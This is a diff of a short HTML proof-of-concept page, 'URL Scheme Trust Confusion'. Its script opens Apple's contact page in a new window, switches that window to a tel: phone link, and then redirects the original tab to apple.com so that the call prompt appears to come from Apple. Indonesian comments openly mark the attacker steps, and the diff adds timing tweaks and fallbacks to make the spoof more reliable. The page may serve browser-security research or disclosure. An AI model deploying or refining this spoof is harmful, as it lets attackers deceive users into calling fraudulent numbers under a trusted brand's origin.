@@ -1,21 +1,35 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <meta charset="utf-8">
-        <title>URL Scheme Reference Origin Spoof</title>
-    </head>
-    <body>
-        <u><a id="contact" onclick="contactSite()">Contact Apple</a></u>
-        <script type="text/javascript">
-            function contactSite() {
-                var x = window.open("https://www.apple.com/contact");
-                setTimeout(function() {
-                    x.location.href = "tel:+123456789";
-                }, 1500);
-                setTimeout(function() {
-                    location.href = "https://www.apple.com/contact";
-                }, 5000);
-            }
-        </script>
-    </body>
+<head>
+    <meta charset="utf-8">
+    <title>URL Scheme Trust Confusion</title>
+</head>
+<body>
+    <u><a id="contact" onclick="contactSite()">Contact Apple</a></u>
+
+    <script>
+    function contactSite() {
+        // Step 1: buka tab ke Apple
+        let win = window.open("https://www.apple.com/contact", "_blank");
+
+        // Step 2: begitu apple.com selesai render → trigger tel:
+        win.onload = function () {
+            // Delay kecil untuk memastikan URL bar sudah "fix"
+            setTimeout(() => {
+                win.location = "tel:+123456789";
+            }, 300);
+        };
+
+        // Fallback kalau onload ga ketembak (karena CSP / redirection / cache)
+        setTimeout(() => {
+            try { win.location = "tel:+123456789"; } catch (e) {}
+        }, 3500);
+
+        // Step 3: attacker tab kembali redirect ke Apple agar terlihat trusted
+        setTimeout(() => {
+            location.href = "https://www.apple.com/contact";
+        }, 1200);
+    }
+    </script>
+</body>
 </html>
